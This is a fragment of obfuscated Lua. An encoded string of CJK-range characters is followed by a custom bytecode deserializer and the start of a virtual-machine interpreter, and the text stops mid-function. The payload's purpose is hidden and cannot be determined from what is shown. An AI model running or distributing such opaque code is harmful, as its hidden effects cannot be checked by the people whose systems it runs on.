㒞㒢㒣㒝㒜㒗㒥㒘㒠㒠㒡㒗㒦㒠㒣㒞㒞㒗㒠㒡㒤㒜㒝㒦㒦㒤㒚㒙㒢㒟㒥㒦㒥㒝㒚㒜㒙㒡㒛㒛㒞㒦㒗㒠㒠㒚㒗㒠㒝㒦㒠㒗㒣㒗㒤㒞㒝㒚㒘㒥㒛㒟㒡㒚㒚㒤㒣㒡㒠㒘㒟㒞㒡㒟㒦㒙㒣㒤㒙㒞㒢㒙㒛㒦㒞㒜㒦㒢㒠㒥㒛㒞㒜㒘㒡㒣㒚㒝㒣㒘㒙㒡㒛㒦㒥㒞㒟㒦㒤㒝㒝㒗㒢㒢㒛㒜㒤㒝㒞㒥㒘㒚㒦㒠㒚㒠㒝㒜㒥㒦㒣㒡㒜㒛㒥㒘㒜㒟㒝㒦㒘㒛㒦㒢㒡㒘㒤㒟㒠㒢㒟㒛㒠㒡㒚㒗㒠㒞㒤㒥㒞㒟㒣㒚㒜㒤㒥㒠㒗㒗㒟㒞㒠㒤㒝㒗㒟㒤㒛㒞㒤㒙㒝㒣㒦㒞㒟㒙㒘㒗㒟㒢㒚㒜㒤㒣㒜㒝㒥㒘㒞㒣㒗㒝㒠㒘㒙㒗㒣㒡㒛㒗㒝㒢㒤㒜㒦㒗㒟㒢㒘㒞㒟㒥㒠㒜㒛㒢㒙㒘㒤㒟㒗㒥㒣㒥㒜㒡㒟㒛㒢㒦㒛㒠㒤㒝㒞㒤㒜㒚㒤㒠㒤㒦㒝㒝㒥㒛㒣㒥㒝㒟㒥㒚㒞㒥㒗㒥㒡㒟㒙㒤㒥㒟㒛㒙㒤㒤㒝㒢㒛㒗㒟㒞㒛㒠㒝㒙㒝㒣㒣㒞㒜㒘㒥㒣㒠㒙㒣㒡㒗㒘㒙㒞㒚㒘㒛㒢㒤㒝㒝㒙㒣㒞㒙㒦㒝㒛㒡㒣㒣㒚㒤㒞㒙㒥㒣㒡㒟㒘㒗㒡㒠㒜㒙㒦㒢㒗㒛㒞㒟㒤㒤㒚㒥㒡㒗㒦㒦㒝㒙㒤㒡㒚㒛㒠㒦㒗㒚㒙㒠㒣㒠㒚㒞㒠㒟㒦㒣㒤㒗㒤㒤㒟㒝㒙㒦㒤㒟㒟㒘㒡㒡㒙㒛㒢㒣㒛㒙㒣㒦㒞㒞㒙㒗㒣㒠㒤㒘㒦㒡㒣㒟㒝㒤㒘㒝㒢㒦㒟㒝㒦㒘㒝㒘㒣㒢㒝㒡㒢㒢㒜㒥㒗㒞㒢㒗㒢㒢㒜㒙㒤㒣㒜㒣㒥㒜㒟㒚㒦㒟㒦㒟㒡㒘㒛㒡㒦㒚㒠㒣㒛㒜㒙㒟㒤㒞㒟㒚㒥㒦㒠㒙㒚㒢㒥㒛㒢㒡㒘㒙㒞㒠㒥㒗㒛㒢㒡㒦㒠㒙㒚㒝㒤㒜㒞㒥㒙㒞㒤㒜㒛㒚㒡㒛㒗㒟㒝㒛㒦㒙㒛㒣㒢㒤㒘㒞㒞㒤㒚㒣㒘㒡㒢㒣㒝㒜㒗㒥㒣㒙㒛㒚㒠㒤㒘㒡㒝㒢㒤㒤㒛㒚㒤㒟㒦㒦㒡㒟㒜㒘㒦㒡㒡㒚㒛㒣㒘㒜㒤㒥㒘㒠㒦㒝㒠㒠㒛㒙㒥㒢㒠㒣㒘㒠㒟㒤㒥㒝㒜㒙㒡㒣㒗㒥㒛㒟㒤㒣㒟㒜㒙㒥㒦㒝㒝㒗㒣㒦㒙㒛㒠㒜㒦㒤㒜㒛㒟㒚㒙㒘㒟㒝㒢㒚㒜㒗㒠㒦㒦㒟㒝㒗㒡㒦㒜㒞㒡㒘㒙㒛㒝㒝㒥㒘㒠㒚㒝㒛㒗㒝㒡㒦㒜㒟㒙㒥㒟㒝㒦㒞㒝㒗㒢㒜㒙㒟㒟㒥㒞㒦㒛㒦㒦㒙㒠㒢㒛㒛㒘㒢㒟㒘㒥㒛㒛㒗㒡㒡㒗㒟㒗㒣㒠㒙㒚㒜㒤㒥㒟㒞㒤㒗㒣㒟㒗㒜㒗㒗㒢㒣㒞㒣㒗㒛㒙㒡㒞㒟㒙㒘㒣㒡㒞㒚㒘㒣㒛㒜㒡㒥㒜㒞㒙㒡㒞㒚㒘㒙㒢㒢㒝㒛㒘㒙㒟㒗㒥㒘㒛㒜㒡㒗㒙㒝㒟㒠㒦㒡㒜㒛㒢㒡㒘㒣㒜㒗㒦㒠㒡㒙㒛㒢㒦㒛㒠㒤㒠㒤㒙㒦㒜㒗㒛㒞㒥㒡㒠㒚㒚㒣㒛㒡㒦㒗㒤㒞㒘㒣㒟㒝㒙㒦㒞㒠㒟㒢㒙㒤㒤㒝㒞㒦㒙㒢㒡㒤㒗㒥㒞㒝㒤㒣㒛㒥㒢㒛㒛㒢㒞㒝㒘㒠㒣㒙㒝㒢㒤㒢㒘㒦㒦㒡㒝㒥㒡㒘㒚㒦㒝㒟㒢㒦㒜㒣㒗㒜㒡㒥㒠㒠㒚㒜㒡㒛㒘㒡㒞㒢㒦㒛㒝㒡㒠㒚㒙㒡㒢㒦㒙㒝㒟㒢㒜㒦㒦㒘㒠㒜㒚㒥㒥㒞㒢㒦㒘㒘㒞㒞㒥㒝㒛㒛㒟㒠㒟㒡㒙㒦㒤㒟㒟㒘㒞㒠㒗㒞㒠㒡㒙㒡㒘㒘㒞㒤㒙㒗㒣㒠㒞㒙㒥㒞㒣㒤㒤㒝㒜㒘㒣㒙㒚㒞㒦㒗㒣㒗㒝㒚㒗㒣㒢㒜㒞㒙㒢㒜㒥㒛㒛㒘㒤㒡㒜㒜㒙㒛㒦㒤㒡㒝㒛㒦㒦㒟㒡㒘㒛㒡㒦㒢㒤㒣㒗㒘㒥㒥㒠㒞㒛㒗㒥㒢㒣㒗㒚㒢㒥㒛㒟㒤㒚㒞㒤㒦㒟㒟㒚㒘㒥㒣㒠㒟㒙㒣㒤㒜㒞㒥㒚㒦㒤㒗㒞㒠㒙㒙㒣㒢㒞㒛㒘㒤㒣㒝㒝㒦㒘㒟㒣㒘㒝㒡㒘㒚㒢㒣㒝㒜㒗㒥㒢㒟㒝㒗㒗㒠㒢㒙㒜㒢㒗㒛㒢㒦㒜㒝㒦㒦㒡㒠㒜㒘㒘㒜㒡㒚㒛㒣㒦㒜㒢㒗㒛㒞㒦㒗㒠㒡㒛㒙㒘㒦㒠㒛㒚㒤㒥㒝㒢㒜㒚㒟㒥㒘㒟㒢㒚㒚㒥㒜㒟㒜㒙㒦㒤㒞㒢㒤㒙㒠㒤㒝㒠㒡㒙㒛㒣㒤㒞㒝㒙㒟㒣㒟㒞㒙㒘㒡㒣㒚㒟㒚㒘㒜㒢㒥㒝㒞㒘㒘㒢㒠㒝㒙㒗㒢㒢㒝㒟㒢㒗㒝㒢㒗㒜㒟㒗㒜㒡㒡㒜㒚㒦㒣㒢㒞㒜㒗㒦㒞㒡㒘㒛㒠㒙㒚㒠㒢㒛㒛㒥㒤㒠㒝㒛㒡㒥㒟㒠㒙㒚㒡㒥㒚㒟㒣㒚㒜㒤㒥㒠㒠㒜㒚㒤㒠㒟㒛㒙㒢㒤㒢㒞㒤㒙㒝㒣㒦㒞㒡㒛㒦㒣㒡㒞㒝㒘㒣㒣㒜㒝㒥㒘㒞㒣㒗㒝㒠㒙㒝㒢㒢㒝㒟㒗㒤㒢㒞㒜㒦㒗㒟㒢㒘㒜㒡㒗㒚㒡㒣㒜㒡㒦㒥㒡㒡㒜㒗㒦㒠㒡㒙㒜㒤㒦㒛㒠㒤㒛㒣㒥㒦㒡㒚㒛㒘㒥㒡㒠㒚㒚㒣㒥㒜㒟㒥㒚㒣㒥㒗㒟㒢㒚㒙㒤㒤㒟㒛㒚㒚㒤㒝㒞㒦㒙㒣㒤㒘㒤㒝㒙㒚㒣㒤㒞㒜㒙㒚㒣㒞㒞㒛㒚㒟㒣㒙㒝㒢㒘㒛㒘㒠㒝㒝㒘㒗㒢㒟㒝㒘㒚㒗㒢㒚㒝㒘㒗㒜㒢㒘㒜㒞㒗㒗㒡㒠㒝㒛㒙㒝㒡㒛㒜㒚㒦㒝㒥㒟㒛㒟㒦㒘㒠㒡㒜㒜㒥㒣㒠㒜㒛㒜㒥㒞㒣㒘㒚㒠㒥㒙㒟㒢㒛㒝㒤㒤㒟㒝㒚㒞㒤㒟㒢㒞㒙㒡㒤㒚㒞㒣㒚㒞㒣㒥㒞㒞㒙㒠㒣㒠㒠㒜㒘㒢㒣㒛㒝㒤㒙㒟㒢㒦㒝㒟㒘㒢㒢㒡㒟㒤㒗㒣㒢㒜㒜㒥㒗㒞㒢㒗㒜㒠㒗㒠㒡㒢㒜㒥㒦㒤㒡㒟㒛㒦㒦㒟㒡㒘㒛㒡㒦㒠㒠㒣㒛㒢㒥㒥㒠㒥㒛㒗㒥㒠㒠㒙㒚㒢㒥㒠㒟㒤㒚㒟㒤㒦㒟㒡㒚㒘㒥㒗㒟㒚㒙㒣㒤㒠㒞㒥㒟㒚㒤㒗㒞㒡㒙㒙㒤㒗㒞㒛㒙㒘㒥㒜㒝㒦㒘㒟㒣㒘㒣㒝㒘㒚㒢㒤㒝㒜㒗㒥㒤㒤㒝㒗㒗㒥㒢㒙㒜㒥㒗㒛㒡㒤㒜㒝㒘㒘㒤㒚㒜㒘㒗㒗㒡㒚㒠㒜㒦㒜㒠㒥㒛㒞㒗㒙㒠㒠㒛㒙㒦㒙㒠㒛㒝㒥㒥㒝㒟㒦㒚㒟㒦㒚㒟㒡㒚㒚㒥㒛㒟㒜㒚㒗㒤㒞㒟㒗㒙㒠㒥㒛㒞㒢㒙㒛㒤㒝㒞㒝㒝㒛㒣㒟㒞㒘㒘㒡㒤㒜㒝㒣㒘㒜㒣㒟㒝㒞㒜㒙㒢㒠㒝㒙㒗㒢㒢㒛㒜㒤㒗㒝㒢㒝㒜㒟㒗㒢㒡㒡㒜㒜㒦㒣㒡㒜㒛㒥㒦㒞㒡㒝㒛㒠㒦㒟㒠㒢㒛㒢㒥㒤㒠㒝㒚㒦㒥㒟㒠㒝㒚㒡㒥㒜㒟㒣㒚㒞㒤㒥㒟㒤㒚㒗㒤㒠㒟㒝㒙㒢㒚㒗㒞㒤㒙㒞㒣㒦㒞㒤㒙㒘㒣㒥㒠㒙㒘㒣㒣㒜㒝㒥㒞㒚㒣㒗㒝㒡㒘㒙㒢㒢㒟㒡㒗㒤㒢㒢㒜㒦㒗㒢㒢㒘㒜㒡㒗㒚㒡㒥㒟㒚㒦㒥㒡㒤㒜㒗㒦㒢㒡㒙㒛㒢㒦㒛㒠㒤㒞㒜㒥㒦㒠㒤㒛㒘㒥㒣㒠㒚㒚㒥㒥㒜㒠㒛㒝㒚㒥㒗㒟㒥㒚㒙㒚㒝㒟㒛㒙㒥㒤㒝㒞㒦㒙㒟㒤㒜㒠㒠㒙㒚㒣㒣㒞㒜㒞㒠㒣㒞㒞㒘㒘㒠㒣㒙㒠㒘㒘㒛㒣㒙㒝㒝㒘㒙㒢㒟㒝㒘㒗㒡㒣㒜㒝㒣㒗㒜㒢㒛㒜㒞㒚㒦㒡㒠㒜㒙㒦㒢㒢㒝㒛㒤㒦㒝㒡㒝㒛㒟㒦㒡㒠㒡㒛㒚㒥㒣㒡㒞㒚㒥㒥㒞㒠㒟㒚㒠㒥㒡㒟㒢㒚㒛㒤㒤㒟㒝㒙㒦㒤㒟㒟㒟㒙㒡㒤㒡㒞㒣㒙㒤㒣㒥㒞㒤㒙㒗㒣㒠㒞㒠㒘㒢㒦㒢㒝㒤㒘㒞㒢㒦㒝㒟㒘㒘㒢㒥㒟㒙㒗㒣㒢㒜㒜㒥㒚㒥㒢㒗㒜㒡㒗㒙㒡㒦㒞㒚㒦㒤㒡㒝㒛㒦㒚㒛㒡㒘㒛㒢㒦㒚㒡㒥㒞㒝㒥㒥㒠㒥㒛㒗㒘㒡㒠㒙㒚㒢㒥㒛㒠㒦㒜㒠㒤㒦㒠㒗㒚㒘㒦㒗㒟㒚㒙㒣㒤㒜㒠㒗㒛㒡㒤㒗㒟㒙㒙㒙㒘㒙㒞㒛㒘㒤㒣㒝㒟㒘㒚㒢㒣㒘㒞㒛㒘㒚㒢㒦㒝㒜㒗㒥㒢㒞㒝㒗㒜㒘㒢㒙㒝㒙㒗㒛㒢㒞㒜㒝㒗㒘㒡㒟㒜㒘㒛㒣㒡㒚㒜㒙㒦㒜㒡㒛㒛㒞㒦㒞㒠㒠㒛㒟㒘㒞㒠㒛㒛㒚㒥㒝㒣㒦㒚㒟㒥㒙㒟㒡㒚㒚㒤㒣㒟㒠㒛㒤㒤㒞㒟㒗㒙㒠㒘㒙㒞㒢㒙㒜㒣㒤㒞㒡㒚㒥㒣㒟㒞㒘㒘㒡㒗㒛㒝㒣㒘㒝㒢㒥㒞㒠㒛㒘㒢㒠㒝㒟㒗㒢㒣㒢㒜㒤㒗㒝㒡㒦㒜㒟㒚㒗㒡㒡㒜㒟㒦㒣㒡㒞㒛㒥㒦㒠㒡㒗㒛㒦㒚㒚㒠㒢㒛㒟㒥㒤㒦㒙㒚㒦㒥㒠㒠㒘㒚㒦㒥㒚㒠㒗㒜㒛㒤㒥㒟㒞㒚㒗㒚㒜㒟㒙㒙㒣㒤㒛㒞㒤㒛㒣㒣㒦㒞㒤㒙㒘㒣㒤㒞㒚㒘㒣㒣㒜㒟㒗㒛㒙㒣㒗㒝㒦㒘㒙㒦㒡㒝㒛㒗㒤㒢㒝㒞㒘㒗㒟㒢㒘㒝㒘㒗㒚㒤㒤㒜㒜㒦㒥㒡㒞㒝㒙㒦㒠㒡㒙㒜㒚㒦㒛㒢㒥㒛㒝㒥㒦㒠㒟㒜㒚㒥㒡㒠㒚㒛㒜㒥㒜㒡㒟㒚㒞㒥㒗㒟㒠㒛㒛㒤㒢㒟㒛㒚㒞㒤㒝㒠㒣㒙㒟㒤㒘㒞㒡㒙㒚㒣㒣㒞㒜㒙㒜㒣㒞㒞㒡㒘㒠㒣㒛㒝㒢㒘㒛㒢㒤㒝㒝㒘㒜㒢㒟㒝㒞㒗㒡㒢㒡㒜㒣㒗㒜㒡㒥㒜㒞㒗㒜㒡㒠㒜㒛㒦㒢㒡㒝㒛㒤㒦㒣㒠㒦㒛㒟㒦㒜㒠㒡㒠㒦㒥㒣㒠㒝㒚㒥㒥㒣㒠㒗㒚㒤㒗㒘㒟㒢㒚㒛㒤㒤㒥㒙㒙㒦㒤㒠㒟㒘㒙㒡㒦㒠㒞㒣㒙㒡㒣㒥㒞㒡㒙㒗㒣㒠㒞㒙㒙㒤㒥㒢㒝㒤㒘㒣㒢㒦㒡㒞㒘㒘㒢㒡㒝㒚㒘㒥㒢㒜㒜㒥㒗㒥㒢㒗㒟㒡㒗㒙㒡㒢㒜㒛㒗㒦㒡㒝㒛㒦㒗㒗㒡㒘㒞㒘㒦㒚㒠㒣㒛㒜㒗㒗㒠㒞㒛㒗㒦㒙㒠㒙㒟㒝㒥㒛㒟㒤㒚㒝㒦㒘㒟㒟㒚㒘㒥㒛㒟㒚㒜㒦㒤㒜㒞㒥㒙㒞㒤㒗㒞㒠㒙㒙㒤㒙㒞㒛㒙㒞㒣㒝㒞㒘㒘㒟㒣㒘㒝㒡㒘㒚㒣㒙㒝㒜㒘㒛㒢㒞㒝㒞㒗㒠㒢㒙㒜㒢㒗㒛㒢㒙㒜㒝㒗㒘㒡㒟㒜㒚㒦㒡㒡㒚㒛㒣㒦㒜㒡㒙㒛㒞㒦㒜㒠㒠㒛㒙㒥㒢㒠㒟㒚㒤㒥㒝㒟㒦㒚㒟㒚㒤㒟㒡㒚㒛㒤㒣㒟㒜㒝㒥㒤㒞㒟㒛㒙㒠㒤㒙㒞㒢㒙㒛㒣㒤㒞㒝㒙㒡㒣㒟㒞㒜㒘㒡㒣㒛㒝㒣㒘㒜㒢㒥㒝㒤㒚㒣㒢㒠㒝㒝㒗㒢㒘㒡㒜㒤㒗㒞㒡㒦㒜㒟㒗㒘㒡㒥㒞㒙㒦㒣㒡㒜㒛㒥㒜㒤㒡㒗㒛㒡㒦㒙㒣㒢㒞㒞㒥㒤㒠㒢㒚㒦㒚㒜㒠㒘㒞㒢㒥㒚㒠㒥㒚㒞㒤㒥㒟㒣㒚㒗㒗㒞㒟㒙㒙㒢㒤㒛㒞㒤㒚㒤㒣㒦㒞㒟㒙㒘㒣㒢㒞㒚㒘㒣㒣㒜㒟㒗㒛㒟㒣㒗㒝㒥㒘㒙㒤㒤㒝㒛㒗㒤㒢㒝㒝㒜㒙㒚㒢㒘㒝㒗㒗㒚㒡㒦㒜㒜㒦㒦㒡㒞㒜㒘㒦㒠㒡㒙㒜㒛㒦㒛㒠㒤㒛㒝㒦㒘㒠㒟㒛㒘㒥㒡㒠㒚㒝㒠㒥㒜㒠㒚㒚㒞㒥㒙㒟㒠㒚㒚㒤㒢㒟㒟㒛㒣㒤㒝㒞㒦㒙㒟㒚㒙㒞㒡㒙㒛㒣㒣㒟㒞㒛㒦㒣㒞㒞㒜㒘㒠㒣㒚㒝㒢㒘㒛㒢㒤㒟㒝㒛㒡㒢㒟㒝㒝㒗㒡㒢㒟㒜㒣㒗㒡㒡㒥㒝㒠㒗㒗㒡㒠㒜㒠㒦㒢㒤㒥㒛㒤㒦㒝㒠㒦㒛㒟㒦㒘㒠㒡㒛㒟㒥㒣㒠㒣㒚㒥㒥㒠㒠㒗㒜㒠㒥㒙㒟㒢㒚㒠㒤㒤㒟㒢㒙㒦㒦㒛㒟㒘㒛㒡㒤㒚㒞㒣㒙㒡㒣㒥㒞㒣㒙㒗㒦㒙㒞㒙㒙㒤㒣㒛㒝㒤㒘㒣㒢㒦㒠㒠㒘㒘㒢㒡㒝㒚㒘㒥㒢㒜㒜㒥㒗㒥㒢㒗㒝㒠㒗㒙㒡㒢㒜㒛㒗㒦㒡㒝㒛㒦㒗㒗㒡㒘㒜㒤㒦㒚㒠㒣㒛㒜㒗㒗㒠㒞㒛㒗㒦㒙㒠㒙㒜㒢㒥㒛㒟㒤㒚㒝㒤㒦㒟㒟㒚㒘㒥㒗㒟㒚㒚㒜㒤㒜㒟㒗㒙㒞㒥㒙㒞㒠㒙㒙㒤㒙㒞㒛㒙㒦㒣㒝㒝㒦㒘㒟㒥㒘㒝㒡㒘㒚㒣㒚㒝㒜㒘㒜㒢㒞㒠㒥㒗㒠㒢㒙㒜㒢㒗㒛㒢㒜㒜㒝㒦㒦㒡㒟㒜㒚㒦㒡㒢㒜㒛㒣㒦㒜㒡㒞㒛㒞㒙㒘㒠㒠㒛㒙㒥㒢㒡㒝㒚㒤㒥㒝㒠㒠㒚㒟㒦㒙㒟㒡㒚㒚㒤㒣㒠㒞㒙㒥㒤㒞㒟㒢㒙㒠㒦㒘㒞㒢㒙㒛㒣㒤㒟㒟㒘㒦㒣㒟㒞㒤㒘㒡㒣㒦㒝㒣㒘㒜㒢㒥㒝㒞㒘㒗㒢㒠㒝㒢㒗㒢㒣㒗㒜㒤㒗㒟㒡㒦㒝㒟㒗㒘㒡㒡㒜㒢㒦㒣㒡㒦㒛㒥㒗㒗㒡㒗㒞㒠㒦㒙㒠㒢㒛㒣㒥㒤㒤㒙㒚㒦㒘㒟㒠㒘㒚㒡㒥㒚㒟㒣㒚㒣㒤㒥㒟㒠㒚㒗㒤㒢㒟㒙㒚㒤㒤㒛㒞㒤㒙㒥㒣㒦㒞㒠㒙㒘㒣㒡㒞㒚㒚㒣㒣㒜㒝㒥㒘㒦㒣㒗㒞㒘㒘㒙㒣㒗㒝㒛㒘㒦㒢㒝㒜㒦㒘㒙㒢㒘㒝㒥㒗㒚㒡㒣㒜㒜㒦㒥㒡㒞㒜㒗㒗㒘㒡㒙㒜㒜㒦㒛㒠㒦㒛㒝㒗㒦㒠㒟㒛㒘㒦㒙㒠㒚㒛㒛㒥㒜㒤㒘㒚㒞㒗㒗㒟㒠㒚㒙㒥㒜㒟㒛㒚㒛㒤㒝㒡㒜㒙㒟㒤㒘㒞㒡㒙㒚㒤㒛㒞㒜㒙㒟㒣㒞㒞㒙㒘㒠㒤㒛㒝㒢㒘㒛㒣㒝㒝㒝㒛㒥㒢㒟㒝㒘㒗㒡㒤㒚㒜㒣㒗㒜㒢㒞㒜㒞㒗㒠㒡㒠㒞㒦㒦㒢㒢㒝㒛㒤㒦㒝㒡㒠㒛㒟㒙㒙㒠㒡㒛㒚㒥㒣㒡㒞㒚㒥㒥㒞㒠㒢㒚㒠㒦㒗㒟㒢㒚㒛㒤㒤㒠㒟㒙㒦㒤㒟㒟㒤㒙㒡㒥㒗㒞㒣㒙㒜㒣㒥㒟㒠㒙㒗㒣㒠㒞㒦㒘㒢㒗㒟㒝㒤㒘㒝㒢㒦㒝㒟㒘㒘㒢㒡㒝㒤㒗㒣㒣㒙㒜㒥㒗㒠㒢㒗㒜㒠㒗㒙㒡㒢㒜㒦㒦㒤㒡㒢㒛㒦㒦㒟㒡㒘㒝㒡㒦㒚㒠㒣㒜㒘㒥㒥㒠㒦㒛㒗㒦㒥㒠㒙㒜㒢㒥㒛㒟㒤㒛㒚㒤㒦㒠㒗㒚㒘㒗㒝㒟㒚㒛㒣㒤㒜㒞㒥㒚㒜㒤㒗㒟㒘㒙㒙㒦㒚㒞㒛㒚㒤㒣㒝㒝㒦㒙㒞㒣㒘㒞㒙㒘㒚㒦㒛㒝㒜㒙㒥㒢㒞㒝㒗㒘㒠㒢㒙㒝㒚㒗㒛㒣㒝㒜㒝㒘㒦㒡㒟㒜㒘㒗㒢㒡㒚㒜㒛㒦㒜㒤㒚㒛㒞㒘㒗㒠㒠㒛㒙㒦㒤㒠㒛㒛㒜㒥㒝㒢㒥㒚㒟㒗㒘㒟㒡㒚㒚㒥㒦㒟㒜㒚㒝㒤㒞㒡㒛㒙㒠㒦㒙㒞㒢㒙㒛㒥㒘㒞㒝㒙㒞㒣㒟㒠㒝㒘㒡㒣㒚㒝㒣㒘㒜㒣㒞㒝㒞㒙㒛㒢㒠㒝㒛㒗㒢㒣㒝㒜㒤㒗㒝㒢㒠㒜㒟㒘㒚㒡㒡㒜㒚㒦㒣㒣㒜㒛㒥㒦㒞㒡㒡㒛㒠㒦㒣㒠㒢㒟㒙㒥㒤㒠㒝㒚㒦㒥㒟㒠㒣㒚㒡㒥㒚㒟㒣㒚㒠㒤㒥㒠㒞㒚㒗㒤㒠㒟㒤㒙㒢㒤㒥㒞㒤㒙㒣㒣㒦㒟㒡㒙㒘㒣㒡㒞㒦㒘㒣㒦㒝㒝㒥㒘㒞㒣㒗㒞㒢㒘㒙㒢㒢㒞㒘㒗㒤㒗㒗㒜㒦㒗㒟㒢㒘㒝㒣㒗㒚㒡㒣㒝㒚㒦㒥㒥㒞㒜㒗㒦㒠㒡㒙㒜㒤㒦㒛㒠㒤㒜㒜㒥㒦㒣㒦㒛㒘㒥㒡㒠㒚㒚㒣㒥㒜㒟㒥㒛㒚㒥㒗㒠㒟㒚㒙㒤㒤㒟㒛㒚㒤㒤㒝㒞㒦㒚㒚㒤㒘㒢㒝㒙㒚㒤㒟㒞㒜㒘㒥㒣㒞㒞㒗㒙㒜㒣㒙㒝㒢㒘㒛㒢㒥㒝㒝㒙㒘㒢㒟㒝㒘㒘㒞㒢㒚㒟㒤㒗㒜㒡㒥㒜㒞㒘㒙㒡㒠㒜㒙㒗㒠㒡㒛㒠㒜㒦㒝㒠㒦㒛㒟㒗㒚㒠㒡㒛㒚㒦㒢㒠㒜㒟㒡㒥㒞㒠㒗㒚㒠㒦㒛㒟㒢㒚㒛㒥㒤㒟㒝㒚㒚㒤㒟㒟㒘㒙㒡㒤㒚㒞㒣㒙㒜㒤㒢㒞㒞㒚㒗㒣㒠㒞㒛㒘㒢㒤㒝㒝㒤㒘㒝㒣㒤㒝㒟㒛㒙㒢㒡㒝㒚㒗㒣㒣㒞㒜㒥㒗㒞㒢㒦㒜㒠㒚㒛㒡㒢㒜㒛㒦㒤㒢㒟㒛㒦㒦㒟㒢㒘㒛㒡㒦㒠㒠㒣㒛㒜㒥㒥㒡㒠㒛㒗㒥㒠㒡㒚㒚㒢㒗㒦㒟㒤㒚㒝㒤㒦㒟㒟㒚㒘㒤㒡㒠㒘㒙㒣㒥㒝㒞㒥㒙㒠㒤㒗㒞㒠㒙㒙㒣㒢㒟㒗㒘㒤㒤㒚㒝㒦㒙㒝㒣㒘㒞㒡㒘㒚㒢㒣㒞㒗㒗㒥㒦㒤㒝㒗㒘㒜㒢㒙㒝㒤㒗㒛㒡㒤㒝㒙㒦㒦㒡㒠㒜㒘㒦㒡㒡㒚㒝㒣㒦㒜㒠㒥㒜㒚㒦㒗㒡㒜㒛㒙㒦㒗㒠㒛㒛㒦㒥㒝㒟㒦㒛㒝㒥㒘㒠㒥㒚㒚㒤㒣㒟㒜㒙㒥㒤㒞㒟㒗㒚㒜㒤㒙㒟㒠㒙㒛㒣㒦㒞㒝㒚㒦㒣㒟㒞㒘㒙㒝㒣㒚㒞㒟㒘㒜㒦㒞㒝㒞㒘㒗㒢㒠㒝㒙㒘㒠㒢㒛㒜㒤㒗㒝㒢㒗㒜㒟㒘㒚㒡㒡㒜㒚㒗㒢㒡㒜㒞㒦㒦㒞㒡㒗㒛㒠㒗㒛㒠㒢㒛㒛㒦㒤㒠㒝㒛㒥㒥㒟㒠㒘㒚㒡㒦㒜㒟㒣㒚㒜㒥㒦㒟㒞㒛㒥㒤㒠㒟㒙㒙㒢㒥㒝㒞㒤㒙㒝㒥㒘㒞㒟㒜㒣㒣㒡㒞㒚㒘㒣㒣㒜㒝㒥㒘㒞㒣㒦㒝㒠㒙㒛㒢㒢㒝㒝㒗㒤㒢㒝㒠㒘㒗㒟㒢㒦㒜㒡㒘㒙㒡㒣㒜㒥㒦㒥㒡㒞㒜㒗㒦㒠㒡㒥㒛㒢㒗㒙㒠㒤㒛㒟㒥㒦㒡㒟㒛㒘㒥㒡㒠㒥㒚㒣㒗㒢㒟㒥㒛㒚㒥㒗㒟㒠㒚㒙㒤㒢㒟㒥㒙㒤㒤㒟㒞㒦㒙㒠㒤㒘㒞㒡㒙㒚㒣㒣㒞㒜㒘㒥㒣㒟㒞㒗㒘㒠㒣㒙㒝㒢");local u=((0x83a0/162)-121)local l=53 local o=n;local e={}e={[(0x1d/29)]=function()local x,e,n,d=y(J,o,o+g);o=o+j;l=(l+(u*j))%a;return(((d+l-(u)+r*(j*i))%r)*((i*A)^i))+(((n+l-(u*i)+r*(i^g))%a)*(r*a))+(((e+l-(u*g)+A)%a)*r)+((x+l-(u*j)+A)%a);end,[((0x153-225)+-112)]=function(e,e,e)local e=y(J,o,o);o=o+x;l=(l+(u))%a;return((e+l-(u)+A)%r);end,[((169-0x60)-0x46)]=function()local e,d=y(J,o,o+i);l=(l+(u*i))%a;o=o+i;return(((d+l-(u)+r*(i*j))%r)*a)+((e+l-(u*i)+a*(i^g))%r);end,[(0x7c+-120)]=function(o,e,l)if l then local e=(o/i^(e-n))%i^((l-x)-(e-n)+x);return e-e%n;else local e=i^(e-x);return(o%(e+e)>=e)and n or m;end;end,[(-98+(0xe3-124))]=function()local l=e[(210/0xd2)]();local o=e[(0x2e+-45)]();local c=n;local d=(e[(0x47-67)](o,x,p+j)*(i^(p*i)))+l;local l=e[((10332/0xa4)-0x3b)](o,21,31);local e=((-n)^e[(-102+0x6a)](o,32));if(l==m)then if(d==L)then return e*m;else l=x;c=L;end;elseif(l==(r*(i^g))-x)then return(d==m)and(e*(x/L))or(e*(m/L));end;return H(e,l-((a*(j))-n))*(c+(d/(i^R)));end,[((7800/0x3c)-0x7c)]=function(d,c,c)local c;if(not d)then d=e[(208/0xd0)]();if(d==m)then return'';end;end;c=K(J,o,o+d-n);o=o+d;local e=''for o=x,#c do e=Q(e,Y((y(K(c,o,o))+l)%a))l=(l+u)%r end return e;end}local function J(...)return{...},V('#',...)end local function A()local w={};local d={};local l={};local h={w,d,nil,l};local o={}local O=(0xd5-145)local l={[(0x81-125)]=(function(l)return not(#l==e[(123-0x79)]())end),[(-0x74+116)]=(function(l)return e[(0x91/29)]()end),[(612/0xcc)]=(function(l)return e[((0x39c/12)+-71)]()end),[(-50+0x34)]=(function(l)local d=e[(-0x19+31)]()local l=''local e=1 for o=1,#d do e=(e+O)%a l=Q(l,Y((y(d:sub(o,o))+e)%r))end return l end)};for e=x,e[(15/0xf)]()do d[e-x]=A();end;local d=e[(58+-0x39)]()for d=1,d do local e=e[(-0x22+36)]();local n;local e=l[e%(46-0x21)];o[d]=e and e({});end;for h=1,e[(0x54-83)]()do local l=e[(73+(-0x3e-9))]();if(e[(71-0x43)](l,n,x)==L)then local r=e[(0x1fc/127)](l,i,g);local d=e[((141+-0x70)+-0x19)](l,j,i+j);local l={e[(0x80+-125)](),e[(-0x56+89)](),nil,nil};local a={[(0x0/(0x206-317))]=function()l[k]=e[((47709/0x5d)/0xab)]();l[s]=e[(0x2a-39)]();end,[(0x54-83)]=function()l[t]=e[(111-0x6e)]();end,[(0x79-119)]=function()l[M]=e[(0xae/174)]()-(i^p)end,[((148+-0x2b)+-0x66)]=function()l[c]=e[(159/0x9f)]()-(i^p)l[N]=e[(0x147/109)]();end};a[r]();if(e[(83-0x4f)](d,x,n)==x)then l[U]=o[l[b]]end if(e[(101+(-8+-0x59))](d,i,i)==n)then l[D]=o[l[M]]end if(e[(0x23+-31)](d,g,g)==x)then l[v]=o[l[B]]end w[h]=l;end end;h[3]=e[((706-0x192)/0x98)]();return h;end;local function m(e,j,u)local L=e[i];local r=e[g];local a=e[n];return(function(...)local e=n e*=-1 local e=e;local A={};local e=J local l=n;local p={...};local y=V('#',...)-x;local o={};local a=a;local g={};local r=r;local L=L;for e=0,y do if(e>=r)then A[e-r]=p[e+x];else 